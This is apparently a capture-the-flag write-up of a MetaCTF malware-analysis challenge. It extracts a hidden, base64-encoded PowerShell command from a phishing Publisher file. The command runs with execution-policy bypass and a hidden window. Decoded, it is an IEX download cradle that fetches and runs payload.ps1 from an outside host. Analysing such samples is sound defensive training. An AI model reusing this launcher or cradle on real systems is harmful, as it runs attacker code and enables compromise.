# Publish3r - 225pts
> We believe we found a malicious file on someone's workstation. Judging by looking at it, the file likely came from a phishing email. Anyways, we'd like you to analyze the sample, so we can see what would have happened if it executed successfully. That way we can hunt for signs of it across the enterprise. Your flag will be the URL that the malware is trying to reach out to! Can you do it? Format: MetaCTF{http://.........} Note: We've put the actual file in an encrypted 7z so your browser doesn't complain when downloading it (and our site doesn't get flagged as malware). The password is metactf
<hr>

After unzipping the 7zip archive, we are presented `Publish3r.pub`. 

Let's take a look at the file contents using `strings Publish3r.pub`. If we go through all the strings, one stands out from the rest:
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec Bypass -windowstyle hidden -enc SQBFAHgAIAAoACgAbgBFAFcALQBPAEIASgBlAEMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACgAIgBoAHQAdABwADoALwAvADEAMwAuADMANwAuADEAMAAuADEAMAA6ADQANAA0ADMALwBkAG8AYwAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAiACkAKQApAA==
```

Here we have a PowerShell script. with the actual script itself being base64 encoded. Let's decode this using 
```shell
echo "SQBFAHgAIAAoACgAbgBFAFcALQBPAEIASgBlAEMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACgAIgBoAHQAdABwADoALwAvADEAMwAuADMANwAuADEAMAAuADEAMAA6ADQANAA0ADMALwBkAG8AYwAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAiACkAKQApAA==" | base64 --decode
```

And we can see the actual PowerShell script being executed:
```powershell
IEx ((nEW-OBJeCt net.webclient).downloadstring(("http://13.37.10.10:4443/doc/payload.ps1")))
```

